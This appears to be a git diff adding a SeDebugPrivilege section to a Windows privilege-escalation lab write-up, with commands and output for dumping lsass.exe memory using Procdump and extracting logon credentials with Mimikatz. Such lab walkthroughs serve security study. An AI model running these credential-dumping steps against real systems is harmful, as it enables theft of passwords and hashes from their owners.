@@ -139,3 +139,63 @@ Finally, we navigate to the Administrator's desktop and read the flag:
 ```bash
 PS C:\Windows\system32> Get-Content c:\Users\Administrator\Desktop\SeImpersonate\flag.txt
 ```
+
+## SeDebugPrivilege
+
+Step 1: Verify SeDebugPrivilege is available
+```bash
+whoami /priv
+```
+Output:
+```bash
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeDebugPrivilege              Debug programs                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+`SeDebugPrivilege` is available but disabled. Since we have this privilege, we can debug or dump process memory, including `lsass.exe`.
+
+Step 2: Dump the memory of lsass.exe using Procdump
+
+```bash
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+Output:
+```bash
+[22:32:24] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
+[22:32:25] Dump 1 writing: Estimated dump file size is 42 MB.
+[22:32:25] Dump 1 complete: 42 MB written in 0.9 seconds
+[22:32:26] Dump count reached.
+```
+We successfully dumped the memory of `lsass.exe` to a file called `lsass.dmp`
+
+Step 3: Navigate to Mimikatz directory and launch it
+
+```bash
+cd C:\Tools\Mimikatz\x64
+mimikatz.exe
+```
+Output:
+```bash
+.#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+```
+
+Step 4: Configure Mimikatz to use the minidump file
+
+```bash
+mimikatz # log
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+```
+
+![image](https://github.com/user-attachments/assets/609b3a2d-887b-4c8b-bb74-4b21deb9efa8)
+
+
+
+
